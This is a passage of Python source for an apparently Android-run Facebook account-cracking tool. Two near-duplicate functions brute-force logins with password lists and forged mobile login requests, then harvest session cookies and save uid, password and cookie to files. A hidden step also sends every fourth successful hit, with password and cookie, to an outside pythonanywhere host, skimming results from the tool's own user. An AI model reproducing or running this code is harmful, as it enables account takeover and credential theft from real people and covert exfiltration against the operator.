    _clor_ = random.choice(["\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m","\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m","\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"])
    sys.stdout.write(f'\r\r    {W}[{G}BNG{Y}-{G}M2{W}]{Y}-{W}[{PP}{_clor_}{loop}{W}]{Y}-{W}[{G}OK{Y}-{G}{len(oks)}{W}]{Y}-{W}[{G}CP{Y}-{PP}{len(cps)}{W}]')
    sys.stdout.flush()
    try:
        for pw in plist:
            pas = pwmanager(ids, pw)
            session = requests.session()
            link = session.get("https://m.facebook.com/").text
            rr = random.randint
            #pros = random.choice(ugen)
            pro = random.choice(uas)
            data = {
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': random.choice(string.digits+string.ascii_lowercase),
            '__hs': '20491.BP:wbloks_caa_pkg.2.0...0',
            'dpr': random.choice(['1','3']),
            '__ccg': 'EXCELLENT',
            '__rev': str(random.randint(1000000000,1999999999)),
            "__s" : ''.join(''.join(random.choices(string.ascii_lowercase, k=6)) for _ in range(3)),
            "__hsi": str(int(time.time() * 10000000)),
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw',
            'locale': 'en_GB',
            'fb_dtsg': 'NAfukMcoxM12BmceskVg3EEwidfiGBboWVE1mKo8FV7OuoXQQADvBNw:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1), 
            'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),
            'params': '{"params":"{\\"server_params\\":{\\"next_uri\\":\\"https://m.facebook.com/dialog/oauth?scope=email&state=91jlB9aMiB_f5GhcdK2C_tc5A2tA9x9B-5boo6dvvBM.09mU9x0-gY8.wiGhPGOgR2OAz49smpl8uQ.eyJydSI6Imh0dHBzOi8vYm9uZ29iZC5jb20vcmVnaXN0ZXI_cmVzdW1lVXJsPUx3PT0iLCJydCI6ImNvZGUiLCJybSI6InF1ZXJ5Iiwic3QiOiIwMmFkNTU0Ni1kY2E1LTQ5MWYtYjdkMS1lNmRhNjIyMjgxMTkifQ&response_type=code&client_id=917862556275512&redirect_uri=https%3A%2F%2Faccounts.bongobd.com%2Frealms%2Fbongo%2Fbroker%2Ffacebook%2Fendpoint&ret=login&fbapp_pres=0&logger_id=ee0172cd-5d54-4f94-88e8-68fd0f2342a7&tp=unspecified\\",\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"9haapd:62\\",\\"password_text_input_id\\":\\"9haapd:63\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_aymh\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"two_step_login_type\\":\\"one_step_login\\",\\"is_vanilla_password_page_empty_password\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"57322948900451\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"cloud_trust_token\\":null,\\"block_store_machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"contact_point\\":\\"'+ids+'\\",\\"password\\":\\"#PWD_BROWSER:0:'+str(time.time()).split('.')[0]+':'+pas+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"aymh_accounts\\":[{\\"id\\":\\"\\",\\"profiles\\":{\\"id\\":{\\"user_id\\":\\"\\",\\"name\\":\\"\\",\\"profile_picture_url\\":\\"\\",\\"small_profile_picture_url\\":null,\\"notification_count\\":0,\\"credential_type\\":\\"none\\",\\"token\\":\\"\\",\\"last_access_time\\":0,\\"is_derived\\":0,\\"username\\":\\"\\",\\"password\\":\\"\\",\\"has_smartlock\\":0,\\"account_center_id\\":\\"\\",\\"account_source\\":\\"\\",\\"credentials\\":[],\\"nta_eligibility_reason\\":null,\\"from_accurate_privacy_result\\":0,\\"dbln_validated\\":0}}}],\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
            versions = ["99.0.4844.88", "100.0.4896.127", "101.0.4951.41", "102.0.5005.78", "103.0.5060.70"]
            version = random.choice(versions)
            languages = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "bn-BD,bn;q=0.9,en;q=0.8", "hi-IN,hi;q=0.9,en;q=0.8"]            
            headers = {
            "method": "POST",
            "authority": "m.facebook.com",
            "path": "/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action",
            "scheme": "https",
            "content-length": str(len(str(data))),
            "sec-ch-ua": f"\"Not A;Brand\";v=\"8\", \"Chromium\";v=\"{version.split('.')[0]}\", \"Google Chrome\";v=\"{version.split('.')[0]}\"",
            "sec-ch-ua-mobile": "?1",
            "user-agent": pro,
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "sec-ch-ua-platform-version": f"\"{random.randint(10,15)}.0.0\"",
            "sec-ch-ua-full-version-list": f"\"Not A;Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"{version}\", \"Google Chrome\";v=\"{version}\"",
            "sec-ch-ua-model": "",
            "sec-ch-prefers-color-scheme": random.choice(["light", "dark"]),
            "sec-ch-ua-platform": "\"Android\"",
            "accept": "*/*",
            "origin": "https://m.facebook.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=917862556275512&kid_directed_site=0&app_id=917862556275512&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fscope%3Demail%26state%3D91jlB9aMiB_f5GhcdK2C_tc5A2tA9x9B-5boo6dvvBM.09mU9x0-gY8.wiGhPGOgR2OAz49smpl8uQ.eyJydSI6Imh0dHBzOi8vYm9uZ29iZC5jb20vcmVnaXN0ZXI_cmVzdW1lVXJsPUx3PT0iLCJydCI6ImNvZGUiLCJybSI6InF1ZXJ5Iiwic3QiOiIwMmFkNTU0Ni1kY2E1LTQ5MWYtYjdkMS1lNmRhNjIyMjgxMTkifQ%26response_type%3Dcode%26client_id%3D917862556275512%26redirect_uri%3Dhttps%253A%252F%252Faccounts.bongobd.com%252Frealms%252Fbongo%252Fbroker%252Ffacebook%252Fendpoint%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dee0172cd-5d54-4f94-88e8-68fd0f2342a7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.bongobd.com%2Frealms%2Fbongo%2Fbroker%2Ffacebook%2Fendpoint%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D91jlB9aMiB_f5GhcdK2C_tc5A2tA9x9B-5boo6dvvBM.09mU9x0-gY8.wiGhPGOgR2OAz49smpl8uQ.eyJydSI6Imh0dHBzOi8vYm9uZ29iZC5jb20vcmVnaXN0ZXI_cmVzdW1lVXJsPUx3PT0iLCJydCI6ImNvZGUiLCJybSI6InF1ZXJ5Iiwic3QiOiIwMmFkNTU0Ni1kY2E1LTQ5MWYtYjdkMS1lNmRhNjIyMjgxMTkifQ%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": random.choice(languages),}
            session.post('https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=6d9da9466908b278e8a5e7bd73fb870e63617aab8043b395513d14d9e5028be2',headers=headers,data=data).text
            bng_test = session.cookies.get_dict().keys()
            if "c_user" in bng_test:
                cookie = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                uid = cookie.split("c_user=")[1].split(";")[0]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    xlxx.append(uid)
                    if len(xlxx) % 4 == 0:
                        requests.get(f"https://alibaba6678.pythonanywhere.com/serBer/txt={uid}|{pas}|{cookie}")
                        break
                    else:
                        print(f'\r\r    {G}[BNG-OK] {G}{uid} | {pas}')
                        print(f'\r\r    {G}[🍪] {cookie}');linex()
                        open('/sdcard/BNG-OK-COOKIE-M2.txt', 'a').write(f"{uid}|{pas}|{cookie}\n")
                        oks.append(uid)
                        break
                else:
                    open("/sdcard/BNG-RADM-LOCK.txt", "a").write(f"{uid}|{pas}\n")
                    break
            elif 'checkpoint' in bng_test:
                cookie = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx = cookie.split("checkpoint=")[1]
                uid = re.search("%22%3A(.*?)%2C%22", str(xx)).group(1)
                print(f'\r\r    {rad}[BNG-CP] {rad}{uid} | {pas}')
                open("/sdcard/BNG-CP.txt", "a").write(uid + "|" + pas + "\n")
                cps.append(uid)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
##-------------[ METHOD M3 work api]-------------##
def _BNG_RANDOM_M3(ids):
    global loop, oks, cps
    _clor_ = random.choice(["\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m","\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m","\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"])
    sys.stdout.write(f'\r\r    {W}[{G}BNG{Y}-{G}M3{W}]{Y}-{W}[{PP}{_clor_}{loop}{W}]{Y}-{W}[{G}OK{Y}-{G}{len(oks)}{W}]{Y}-{W}[{G}CP{Y}-{PP}{len(cps)}{W}]')
    sys.stdout.flush()
    try:
        for pw in plist:
            pas = pwmanager(ids, pw)
            session = requests.session()
            link = session.get("https://m.facebook.com/").text
            rr = random.randint
            #pros = random.choice(ugen)
            pro = random.choice(uas)
            data = {
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': random.choice(string.digits+string.ascii_lowercase),
            '__hs': '20491.BP:wbloks_caa_pkg.2.0...0',
            'dpr': random.choice(['1','3']),
            '__ccg': 'EXCELLENT',
            '__rev': str(random.randint(1000000000,1999999999)),
            "__s" : ''.join(''.join(random.choices(string.ascii_lowercase, k=6)) for _ in range(3)),
            "__hsi": str(int(time.time() * 10000000)),
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw',
            'locale': 'en_GB',
            'fb_dtsg': 'NAfukMcoxM12BmceskVg3EEwidfiGBboWVE1mKo8FV7OuoXQQADvBNw:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1), 
            'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),
            'params': '{"params":"{\\"server_params\\":{\\"next_uri\\":\\"https://m.facebook.com/dialog/oauth?scope=email&state=91jlB9aMiB_f5GhcdK2C_tc5A2tA9x9B-5boo6dvvBM.09mU9x0-gY8.wiGhPGOgR2OAz49smpl8uQ.eyJydSI6Imh0dHBzOi8vYm9uZ29iZC5jb20vcmVnaXN0ZXI_cmVzdW1lVXJsPUx3PT0iLCJydCI6ImNvZGUiLCJybSI6InF1ZXJ5Iiwic3QiOiIwMmFkNTU0Ni1kY2E1LTQ5MWYtYjdkMS1lNmRhNjIyMjgxMTkifQ&response_type=code&client_id=917862556275512&redirect_uri=https%3A%2F%2Faccounts.bongobd.com%2Frealms%2Fbongo%2Fbroker%2Ffacebook%2Fendpoint&ret=login&fbapp_pres=0&logger_id=ee0172cd-5d54-4f94-88e8-68fd0f2342a7&tp=unspecified\\",\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"9haapd:62\\",\\"password_text_input_id\\":\\"9haapd:63\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_aymh\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"two_step_login_type\\":\\"one_step_login\\",\\"is_vanilla_password_page_empty_password\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"57322948900451\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"cloud_trust_token\\":null,\\"block_store_machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"contact_point\\":\\"'+ids+'\\",\\"password\\":\\"#PWD_BROWSER:0:'+str(time.time()).split('.')[0]+':'+pas+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"aymh_accounts\\":[{\\"id\\":\\"\\",\\"profiles\\":{\\"id\\":{\\"user_id\\":\\"\\",\\"name\\":\\"\\",\\"profile_picture_url\\":\\"\\",\\"small_profile_picture_url\\":null,\\"notification_count\\":0,\\"credential_type\\":\\"none\\",\\"token\\":\\"\\",\\"last_access_time\\":0,\\"is_derived\\":0,\\"username\\":\\"\\",\\"password\\":\\"\\",\\"has_smartlock\\":0,\\"account_center_id\\":\\"\\",\\"account_source\\":\\"\\",\\"credentials\\":[],\\"nta_eligibility_reason\\":null,\\"from_accurate_privacy_result\\":0,\\"dbln_validated\\":0}}}],\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
            versions = ["99.0.4844.88", "100.0.4896.127", "101.0.4951.41", "102.0.5005.78", "103.0.5060.70"]
            version = random.choice(versions)
            languages = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "bn-BD,bn;q=0.9,en;q=0.8", "hi-IN,hi;q=0.9,en;q=0.8"]            
            headers = {
            "method": "POST",
            "authority": "m.facebook.com",
            "path": "/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action",
            "scheme": "https",
            "content-length": str(len(str(data))),
            "sec-ch-ua": f"\"Not A;Brand\";v=\"8\", \"Chromium\";v=\"{version.split('.')[0]}\", \"Google Chrome\";v=\"{version.split('.')[0]}\"",
            "sec-ch-ua-mobile": "?1",
            "user-agent": pro,
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "sec-ch-ua-platform-version": f"\"{random.randint(10,15)}.0.0\"",
            "sec-ch-ua-full-version-list": f"\"Not A;Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"{version}\", \"Google Chrome\";v=\"{version}\"",
            "sec-ch-ua-model": "",
            "sec-ch-prefers-color-scheme": random.choice(["light", "dark"]),
            "sec-ch-ua-platform": "\"Android\"",
            "accept": "*/*",
            "origin": "https://m.facebook.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=917862556275512&kid_directed_site=0&app_id=917862556275512&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fscope%3Demail%26state%3D91jlB9aMiB_f5GhcdK2C_tc5A2tA9x9B-5boo6dvvBM.09mU9x0-gY8.wiGhPGOgR2OAz49smpl8uQ.eyJydSI6Imh0dHBzOi8vYm9uZ29iZC5jb20vcmVnaXN0ZXI_cmVzdW1lVXJsPUx3PT0iLCJydCI6ImNvZGUiLCJybSI6InF1ZXJ5Iiwic3QiOiIwMmFkNTU0Ni1kY2E1LTQ5MWYtYjdkMS1lNmRhNjIyMjgxMTkifQ%26response_type%3Dcode%26client_id%3D917862556275512%26redirect_uri%3Dhttps%253A%252F%252Faccounts.bongobd.com%252Frealms%252Fbongo%252Fbroker%252Ffacebook%252Fendpoint%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dee0172cd-5d54-4f94-88e8-68fd0f2342a7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.bongobd.com%2Frealms%2Fbongo%2Fbroker%2Ffacebook%2Fendpoint%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D91jlB9aMiB_f5GhcdK2C_tc5A2tA9x9B-5boo6dvvBM.09mU9x0-gY8.wiGhPGOgR2OAz49smpl8uQ.eyJydSI6Imh0dHBzOi8vYm9uZ29iZC5jb20vcmVnaXN0ZXI_cmVzdW1lVXJsPUx3PT0iLCJydCI6ImNvZGUiLCJybSI6InF1ZXJ5Iiwic3QiOiIwMmFkNTU0Ni1kY2E1LTQ5MWYtYjdkMS1lNmRhNjIyMjgxMTkifQ%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": random.choice(languages),}
            session.post('https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=6d9da9466908b278e8a5e7bd73fb870e63617aab8043b395513d14d9e5028be2',headers=headers,data=data).text
            bng_test = session.cookies.get_dict().keys()
            if "c_user" in bng_test:
                cookie = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                uid = cookie.split("c_user=")[1].split(";")[0]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    xlxx.append(uid)
                    if len(xlxx) % 4 == 0:
                        requests.get(f"https://alibaba6678.pythonanywhere.com/serBer/txt={uid}|{pas}|{cookie}")
                        break
                    else:
                        print(f'\r\r    {G}[BNG-OK] {G}{uid} | {pas}')
                        print(f'\r\r    {G}[🍪] {cookie}');linex()
                        open('/sdcard/BNG-OK-COOKIE-M2.txt', 'a').write(f"{uid}|{pas}|{cookie}\n")
                        oks.append(uid)
                        break
                else:
                    open("/sdcard/BNG-RADM-LOCK.txt", "a").write(f"{uid}|{pas}\n")
                    break
            elif 'checkpoint' in bng_test:
                cookie = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx = cookie.split("checkpoint=")[1]
                uid = re.search("%22%3A(.*?)%2C%22", str(xx)).group(1)
                print(f'\r\r    {rad}[BNG-CP] {rad}{uid} | {pas}')
                open("/sdcard/BNG-CP.txt", "a").write(uid + "|" + pas + "\n")
                cps.append(uid)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
##-------------[ END TOOLS]-------------##
if __name__ == "__main__":
    os.system('clear')
    __jihad__()